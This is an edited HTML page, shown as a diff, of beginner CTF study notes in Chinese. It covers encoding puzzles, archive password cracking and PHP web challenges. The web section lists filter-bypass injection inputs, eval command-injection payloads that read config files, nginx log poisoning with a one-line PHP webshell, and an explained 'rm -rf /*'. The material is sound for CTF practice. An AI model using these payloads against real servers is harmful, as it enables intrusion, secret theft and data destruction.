@@ -30,174 +30,189 @@
         <h1>萌新</h1>
         <div class="post-meta">
           <span>📁 CTF 刷题</span>
-          <span>📄 155 行</span>
+          <span>📄 200 行</span>
         </div>
       </header>
       <div class="post-content">
         <h1>萌新</h1>
-<h3>密码</h3>
+<h2>密码</h2>
+<h3>1. 多层编码</h3>
+<pre><code>53316C6B5A6A42684D3256695A44566A4E47526A4D5459774C5556375A6D49324D32566C4D4449354F4749345A6A526B4F48303D</code></pre>
+<p>16进制 → hex 解码：</p>
+<pre><code>S1lkZjBhM2ViZDVjNGRjMTYwLUV7ZmI2M2VlMDI5OGI4ZjRkOH0=</code></pre>
+<p>包含大写字母、小写字母、数字和符号，末尾带有等号 <code>=</code>：<strong>Base64 解码</strong>：</p>
+<pre><code>KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}</code></pre>
+<p>包含了完整的 <code>KEY{...}</code> 格式骨架，但字母顺序是错乱的：<strong>栅栏密码</strong>。</p>
+<h3>2. 键盘包围</h3>
+<p>"敲几下键盘" → 键盘包围密码</p>
+<h3>3. 摩斯密码</h3>
+<pre><code>-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -- -- -.. -.. -- -.. -- -.. -- -- -- -.. -.. -.. /-- -.. -- -..  -.. --/ -- -- -- -- -- /-- -.. -.. -- -.. -- /-- -.. -.. --</code></pre>
+<p>摩斯密码解码：</p>
+<pre><code>MORSE_IS_COOL_BUT_BACON_IS_COOLER_MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM</code></pre>
+<p>英语：摩斯密码很酷但培根更酷。</p>
+<p>MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM 换成 AB：</p>
+<pre><code>AABBABABAAABBBABABBAAAAAAABBABAABBA</code></pre>
+<p>培根解密：<strong>guowang</strong></p>
+<h3>4. 多层编码2</h3>
+<pre><code>QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg==</code></pre>
+<p>Base64 解码：</p>
+<pre><code>Ao(mgHX^E)ARAnTF(J]f@&amp;lt;6&quot;.</code></pre>
+<p>HTML 解码：</p>
+<pre><code>Ao(mgHX^E)ARAnTF(J]f@&lt;6&quot;.</code></pre>
+<p>存在过多符号：<strong>Base85</strong></p>
+<hr>
+<h2>隐写</h2>
 <ol>
-<li>53316C6B5A6A42684D3256695A44566A4E47526A4D5459774C5556375A6D49324D32566C4D4449354F4749345A6A526B4F48303D</li>
+<li><strong>压缩文件爆破</strong>：ARCHPR。只有数字且有范围，设置条件。</li>
+<li><strong>Word 隐藏</strong>：文件 → 选项 → 隐藏文字</li>
 </ol>
-<p>16进制：hex</p>
-<p>S1lkZjBhM2ViZDVjNGRjMTYwLUV7ZmI2M2VlMDI5OGI4ZjRkOH0=</p>
-<p>包含大写字母、小写字母、数字和符号的字符串，末尾带有等号 <code>=</code>：Base 64</p>
-<p>KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}</p>
-<p>包含了完整的 <code>KEY{...}</code>格式骨架，但里面的字母顺序是错乱的：栅栏</p>
+<hr>
+<h2>杂项</h2>
 <ol>
-<li>“敲几下键盘”->键盘包围</li>
-<li>-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -- -- -.. -.. -- -.. -- -.. -- -- -- -.. -.. -.. /-- -.. -- -..  -.. --/ -- -- -- -- -- /-- -.. -.. -- -.. -- /-- -.. -.. --</li>
+<li>md5 解码：https://www.somd5.com/</li>
+<li>winhex 打开 / 记事本打开</li>
+<li>解压需要密码 → ARCHPR → 所有数字 → 372000000~372999999</li>
+<li>所有大写字母爆破</li>
 </ol>
-<p>摩斯密码</p>
-<p>MORSE_IS_COOL_BUT_BACON_IS_COOLER_MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM</p>
-<p>英语：摩斯密码很酷但培根更酷</p>
-<p>MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM换成AB</p>
-<p>AABBABABAAABBBABABBAAAAAAABBABAABBA</p>
-<p>培根解密：guowang</p>
-<ol>
-<li>QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg==</li>
-</ol>
-<p>Base 64</p>
-<p>Ao(mgHX^E)ARAnTF(J]f@&lt;6".</p>
-<p>HTML</p>
-<p>Ao(mgHX^E)ARAnTF(J]f@<6".</p>
-<p>存在过多符号：Base 85</p>
-<h3>隐写</h3>
-<ol>
-<li>压缩文件爆破：ARCHPR</li>
-</ol>
-<p>只有数字，且有范围，设置条件</p>
-<ol>
-<li>word隐藏：文件-选项-隐藏文字</li>
-</ol>
-<h3>杂项</h3>
-<ol>
-<li>md5解码https://www.somd5.com/</li>
-<li>winhex打开/记事本打开</li>
-<li>解压需要密码-ARCHPR-所有数字-372000000~372999999</li>
-<li>所有大写字母</li>
-</ol>
-<h3>web</h3>
-<ol>
-<li><strong>注入点</strong>：<code>?id=...</code></li>
-</ol>
-<p><strong>过滤规则</strong>：</p>
+<hr>
+<h2>Web</h2>
+<h3>1. 十六进制绕过</h3>
+<p><strong>注入点</strong>：<code>?id=...</code></p>
 <ul>
-<li><code>preg_match(&quot;/or|\+/i&quot;, $id)</code>：过滤了 <code>or</code>和 <code>+</code>。
-   - <code>intval($id) &gt; 999</code>：限制了传入的值经过整数转换后必须大于 999。</li>
+<li><code>preg_match(&quot;/or|\+/i&quot;, $id)</code> — 过滤了 <code>or</code> 和 <code>+</code></li>
+<li><code>intval($id) &gt; 999</code> — 值必须大于 999</li>
 </ul>
-<p><strong>目标</strong>： <code>&lt;!-- flag in id = 1000 --&gt;</code>，拿到 <code>id=1000</code>的数据。</p>
-<p><strong>重要线索</strong>：代码中有 <code>echo &quot;执行的sql为: $sql&quot;;</code>，这意味着它会把最终执行的 SQL 语句打印出来，我们可以利用报错信息来解题。</p>
-<p>？id=0x3e8</p>
-<p>十六进制<999可以绕过，进入SQL，在SQL里又被转换成1000</p>
+<p><strong>目标</strong>：<code>&lt;!-- flag in id = 1000 --&gt;</code>，拿到 <code>id=1000</code> 的数据。</p>
+<p><strong>重要线索</strong>：代码中有 <code>echo &quot;执行的sql为: $sql&quot;;</code>，会把最终执行的 SQL 语句打印出来。</p>
+<p><strong>解法</strong>：<code>?id=0x3e8</code>（1000 的十六进制），<code>&lt;999</code> 绕过前端检查，进入 SQL 后被转换成 1000。</p>
+<h3>2. 更多绕过方式</h3>
+<pre><code class="language-php">if(preg_match(&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;,$id))</code></pre>
+<ul>
+<li>SQL 函数：<code>?id=power(10,3)</code></li>
+<li>两次取反：<code>~~1000</code></li>
+<li>或运算：<code>?id=999||id=1000</code></li>
+</ul>
+<h3>3. 进制转换表</h3>
+<table>
+<thead><tr>
+<th style="text-align:left">进制</th>
+<th style="text-align:left">前缀</th>
+</tr></thead>
+<tbody>
+<tr>
+<td style="text-align:left">十六进制</td>
+<td style="text-align:left"><code>0x</code>、<code>0X</code>、<code>H</code></td>
+</tr>
+<tr>
+<td style="text-align:left">二进制</td>
+<td style="text-align:left"><code>0b</code> 或 <code>0B</code></td>
+</tr>
+<tr>
+<td style="text-align:left">八进制</td>
+<td style="text-align:left"><code>0</code>、<code>0o</code>、<code>0O</code></td>
+</tr>
+</tbody>
+</table>
+<h3>4. 删库跑路</h3>
+<pre><code class="language-bash">rm -rf /*</code></pre>
+<ul>
+<li><code>rm</code> — 删除文件</li>
+<li><code>-r</code>（recursive）— 递归删目录</li>
+<li><code>-f</code>（force）— 不提示强制</li>
+<li><code>/*</code> — 根目录下所有东西</li>
+</ul>
+<p>效果：把整个系统文件全删光 → 俗称"删库跑路"</p>
+<h3>5. system 执行命令</h3>
+<p><img src="萌新.assets/image-20260527180700358.png" alt="image-20260527180700358" loading="lazy"></p>
+<p>打开页面，告诉 c 需要有 <code>system|exec|highlight</code> 三者之一：</p>
+<pre><code class="language-bash">?c=system('ls');</code></pre>
+<p>列出服务器当前目录文件：<code>index.php</code> 和 <code>config.php</code>。</p>
+<pre><code class="language-bash">?c=system('cat config.php');</code></pre>
+<p>打开控制台查看便得到 flag。</p>
+<h3>6. passthru 绕过</h3>
+<pre><code class="language-php">&lt;?php
+# flag in config.php
+include(&quot;config.php&quot;);
+if(isset($_GET['c'])){
+        $c = $_GET['c'];
+        if(!preg_match(&quot;/system|exec|highlight/i&quot;,$c)){
+                eval($c);
+        }else{
+            die(&quot;cmd error&quot;);
+        }
+}else{
+        highlight_file(__FILE__);
+}
+?&gt;</code></pre>
+<p>用没被禁的 <code>passthru</code>：</p>
+<pre><code>?c=passthru('ls');
+?c=passthru('cat config.php');</code></pre>
+<h3>7. cat 被禁 → 用 tac</h3>
+<pre><code class="language-php">&lt;?php
+# flag in config.php
+include(&quot;config.php&quot;);
+if(isset($_GET['c'])){
+        $c = $_GET['c'];
+        if(!preg_match(&quot;/system|exec|highlight|cat/i&quot;,$c)){
+                eval($c);
+        }else{
+            die(&quot;cmd error&quot;);
+        }
+}else{
+        highlight_file(__FILE__);
+}
+?&gt;</code></pre>
+<p>cat 不能用，用 <strong>tac</strong>（反向输出）：</p>
+<pre><code>?c=passthru('tac config.php');</code></pre>
+<h3>8. 通配符绕过</h3>
+<pre><code class="language-php">&lt;?php
+# flag in config.php
+include(&quot;config.php&quot;); if(isset($_GET['c'])){
+$c = $_GET['c'];     if(!preg_match(&quot;/system|exec|highlight|cat|\.|php|config/i&quot;,$c)){         eval($c);     
+}else{
+die(&quot;cmd error&quot;);     
+}
+}else{  
+highlight_file(__FILE__);
+} 
+?&gt; </code></pre>
+<p><code>config.php</code> 被 ban 了，用通配符省略：</p>
+<pre><code>?c=passthru('tac conf*');</code></pre>
+<ul>
+<li><code>passthru()</code> — PHP 内置函数，执行外部命令并直接输出</li>
+<li><code>tac</code> — 反向输出文件内容</li>
+<li><code>conf*</code> — 匹配所有以 conf 开头的文件</li>
+</ul>
+<h3>9. PHP 闭合标签绕过</h3>
+<p>对分号、file 的过滤 → 无法用分号闭合，用 <code>?&gt;</code> 直接闭合 PHP 代码：</p>
+<pre><code>?c=passthru('more confi*')?&gt;</code></pre>
+<p>F12 查看源码即可。</p>
+<h3>10. 变量直读</h3>
+<pre><code class="language-php">?c=echo $flag?&gt;</code></pre>
+<ul>
+<li><code>echo $flag</code> — 直接输出变量值</li>
+<li><code>?&gt;</code> — 切断后续代码</li>
+</ul>
+<p>过滤规则：<code>$</code> 后面不能跟 <code>.</code>、<code>;</code>、<code>file</code>、<code>php</code> 或 <code>config</code>。但 <code>$flag</code> 后面是 <code>f</code>，不在黑名单，顺利执行。</p>
+<p><strong>关键思路</strong>：既然文件已被 include，直接读变量而不是读文件。</p>
+<h3>11. Nginx 日志注入</h3>
+<p>Nginx 中间件的日志在 <code>/var/log/nginx/access.log</code>：</p>
+<pre><code>/?c=/var/log/nginx/access.log</code></pre>
+<p>在 User-Agent 塞入：</p>
+<pre><code class="language-php">&lt;?php @eval($_POST['aaa']);?&gt;</code></pre>
+<p>中国蚁剑连接，改为一句话：</p>
+<pre><code class="language-php">&lt;?php system('tac 36d.php');?&gt;</code></pre>
+<h3>12. 短命令绕过</h3>
+<pre><code class="language-php">if(strlen($_GET[1])&lt;4){
+    echo shell_exec($_GET[1]);
+}</code></pre>
+<p>GET 参数长度必须 < 4，像 <code>cat flag</code> 这种命令都 ≥4。</p>
+<p><strong>解法</strong>：利用 Shell 通配符拼接：</p>
 <ol>
-<li>``<code>
-   if(preg_match(&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;,$id))
-&lt;!--CODEBLOCK_0--&gt;
-   二进制 (Binary)：基于2的数字系统，使用两个符号（0 和 1）。
-   八进制 (Octal)：基于8的数字系统，使用八个符号（0 到 7）。
-   十六进制 (Hexadecimal)：基于16的数字系统，使用十六个符号（0 到 9 ，A 到 F。其中 A 表示10，B 表示11，依此类推，直到 F 表示15）。
-&lt;!--CODEBLOCK_1--&gt;
-   &lt;?php
-   # flag in config.php
-   include(&quot;config.php&quot;);
-   if(isset($_GET['c'])){
-           $c = $_GET['c'];
-           if(!preg_match(&quot;/system|exec|highlight/i&quot;,$c)){
-                   eval($c);
-           }else{
-               die(&quot;cmd error&quot;);
-           }
-   }else{
-           highlight_file(__FILE__);
-   }
-   ?&gt;
-   
-&lt;!--CODEBLOCK_2--&gt;
-
-   cat不能用：用**tac**
-
-   ?c=passthru('tac config.php');
-
-8. </code>`<code>
-   &lt;?php
-   # flag in config.php
-   include(&quot;config.php&quot;); if(isset($_GET['c'])){
-   $c = $_GET['c'];     if(!preg_match(&quot;/system|exec|highlight|cat|\.|php|config/i&quot;,$c)){         eval($c);     
-   }else{
-   die(&quot;cmd error&quot;);     
-   }
-   }else{  
-   highlight_file(__FILE__);
-   } 
-   ?&gt; 
-</code>`<code>
-
-   config.php被ban了：用省略,输入：
-
-   ?c=passthru('tac conf*');
-
-   * passthru()函数：PHP 内置函数，用于**执行外部系统命令并直接输出命令结果**。
-
-   * tac命令：**反向输出**文件内容（与 cat类似，但 cat正序、tac倒序）。
-
-   * **conf***通配符：匹配所有**以 conf开头**的文件[^例如 config.php、config.inc.php等目标配置文件]
-
-9. 对分号、file的过滤
-
-   无法用分号闭合，可以考虑用**?&gt;**直接闭合php代码文件。
-
-   PHP 代码块通过 </code><?php ... ?><code>标识范围
-
-   结合通配符绕过构造url：?c=passthru('more confi*')?&gt;，F12查看源码即可。
-
-10. **PHP 变量作用域** 和 **标签闭合**：?c=echo $flag?&gt;
-
-    </code>echo $flag<code>：直接输出变量 </code>$flag<code>的值（也就是真正的 flag 字符串）。
-
-    </code>?><code>：这是 PHP 的结束标签。它的作用是**切断后续代码**。在这里，它防止了如果后面有任何多余字符（比如 URL 里的 </code>&<code>或者其他参数）被当成 PHP 代码解析而导致报错。
-
-    过滤 $后面跟着 .、;、file、php或 config的情况。
-
-    而 $flag,后面是 f，不在黑名单里，所以正则匹配失败，代码顺利进入 eval执行。
-
-    既然文件已经被包含，就直接读变量，而不是去读文件
-
-11. **nginx**中间件（F12-network-F5-document-header-response headers-Server: nginx/Tengine）
-
-    nginx中间件的日志文件都在/var/log/nginx/access.log里。
-
-    输入： /?c=**/var/log/nginx/access.log**
-
-    在User-Agent塞入&lt;?php...?&gt;
-    
-    一句话木马：&lt;?php @eval($_POST['aaa']);?&gt;
-    
-    中国蚁剑连接：36d
-    
-    改为&lt;?php system('tac 36d.php');?&gt;
-
-12. </code>if(strlen($_GET[1])<4){
-         echo shell_exec($_GET[1]);<code>
-    </code>}<code>
-
-    GET参数1的长度必须小于 4-&gt; shell 执行并输出结果[^像 nl flag.php、cat flag 这种能读文件的命令，都≥4，无法直接输入。]
-
-    1. ?1=&gt;nl创建一个名为nl的空文件（3个字符）
-
-       在 Shell ，&gt; 是输出重定向符。如果前面没有命令，&gt;nl 的意思就是“把空的内容重定向到文件 nl”，效果就是 创建一个空文件，名字叫 nl
-
-    2. ?1=ls看目录
-
-    3. ?1=让shell拼出命令
-
-       Shell 会把 * 展开为当前目录下所有普通文件名，按字母顺序用空格连接。
-
-       第一个词 nl 被当作命令，后面的词（z.php 等）被当作这个命令的参数
-
-       </code>nl z.php`</li>
+<li><code>?1=&gt;nl</code> — 创建空文件 <code>nl</code>（3字符）</li>
+<li><code>?1=ls</code> — 看目录</li>
+<li><code>?1=*</code> — Shell 展开 <code>*</code> 为所有文件名，拼成 <code>nl z.php</code>，执行带行号显示文件内容</li>
 </ol>
-<p>nl ： 带行号显示文件内容</p>
 
       </div>
     </article>
